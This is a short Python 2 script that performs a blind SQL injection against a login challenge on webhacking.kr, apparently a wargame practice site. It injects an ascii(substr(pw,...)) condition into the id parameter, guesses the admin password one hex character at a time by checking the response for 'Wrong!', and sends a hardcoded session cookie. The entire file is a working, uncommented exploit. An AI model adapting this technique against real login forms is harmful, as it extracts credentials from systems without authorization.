import urllib2  
  
url="http://webhacking.kr/challenge/bonus/bonus-2/index.php"   
   

password=''
hexlist = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
for num in range(33):
	for i in hexlist:
		asc = ord(str(i))
		data = "id=admin' and ascii(substr(pw,%d,1))=%d#&pw=asd" %(num,asc)
		httpReq=urllib2.Request(url)   
		httpReq.add_header('Cookie','PHPSESSID=iv9vet0f8ad2i2edfdahdegld5')  
		httpReq.add_data(data)
		httpResp=urllib2.urlopen(httpReq).read()  
		if httpResp.find('Wrong!') < 0:
			password += chr(asc)
			print "index: %d, asc: %s , password: %s" %(num,chr(asc),password)
			break


